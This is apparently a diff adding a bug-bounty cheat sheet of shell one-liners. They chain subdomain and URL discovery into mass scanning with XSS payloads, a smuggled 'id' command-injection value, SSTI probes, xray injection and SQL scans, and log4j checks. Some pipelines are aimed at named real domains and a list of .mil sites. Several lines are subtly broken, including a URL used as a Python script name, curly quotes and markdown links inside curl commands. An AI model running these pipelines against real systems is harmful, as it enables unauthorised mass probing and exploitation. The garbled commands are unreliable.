@@ -1,2 +1,70 @@
 echo 'https://www.cc.gg.jj.jj[200] [HTTP/3,...]' | sed -E ':a; s/\[[^][]*\]//g; ta; s/^[[:space:]]+//; s/[[:space:]]+$//; s/[[:space:]]{2,}/ /g'
 weybackurls | sed -E ':a; s/\[[^][]*\]//g; ta; s/^[[:space:]]+//; s/[[:space:]]+$//; s/[[:space:]]{2,}/ /g'
+
+BBRF SCOPE DoD
+bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil'
+
+Xray Oneliner
+xargs -a urls.txt -I@ sh -c './xray webscan --plugins cmd-injection,sqldet,xss --url "@" --html-output vuln.html'
+
+Katana crawling
+subfinder -d hackerone.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)'
+subfinder -d hackerone.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json
+
+Scan All domains using Knoxss
+    [Explained command]
+echo "dominio" | subfinder -silent | gau | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh 
+
+Scan All github repo ORG
+    [Explained command]
+docker run --rm  mswell/masstrufflehog -o paypal
+
+Scan log4j using BBRF and log4j-scan
+    Explained command
+bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
+
+SSTI in qsreplase add "{{7*7}}" (0xJin)
+cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
+
+urldedupe bhedak
+    [Explained command]
+waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+Hakrawler Airixss XSS
+    [Explained command]
+echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+
+Airixss XSS
+    [Explained command]
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+
+FREQ XSS
+    [Explained command]
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+
+Bhedak
+    [Explained command]
+cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
+
+.bashrc shortcut OFJAAAH
+reconjs(){
+gau -subs $1 |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt ; cat js.txt | anti-burl | awk '{print $4}' | sort -u >> AliveJs.txt
+}
+cert(){
+curl -s "[https://crt.sh/?q=%.$1&output=json](https://crt.sh/?q=%25.$1&output=json)" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
+}
+anubis(){
+curl -s "[https://jldc.me/anubis/subdomains/$1](https://jldc.me/anubis/subdomains/$1)" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
+}
+
+subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
+cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt;
+
+Running JavaScript on each page send to proxy.
+    [Explained command]
+cat 200http | page-fetch --javascript '[...document.querySelectorAll("a")].map(n => n.href)' --proxy http://192.168.1.1:8080
+
+Running cariddi to Crawler
+    [Explained command]
+echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
